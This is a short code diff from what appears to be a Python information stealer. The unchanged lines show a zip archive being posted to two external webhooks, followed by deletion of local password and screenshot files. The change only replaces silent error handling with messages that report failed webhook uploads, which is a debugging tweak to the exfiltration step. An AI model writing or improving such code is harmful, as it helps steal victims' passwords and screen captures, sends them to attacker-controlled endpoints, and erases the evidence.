@@ -461,7 +461,7 @@ with open(zipPath, "rb") as file:
     try:
         response1 = requests.post(webhook1, files=files, data={"payload_json": json.dumps(payload)})
     except Exception as e:
-        pass
+        print("[int] Internal error : 1")
 
 time.sleep(10)
 
@@ -469,7 +469,7 @@ with open(zipPath, "rb") as file:
     try:
         response2 = requests.post(webhook2, files=files, data={"payload_json": json.dumps(payload)})
     except Exception as e:
-        pass
+        print(f"[ext] Error with the webhook : {e}")
 
 SafeRemove(passwordsPath)
 SafeRemove(screenshotPath)
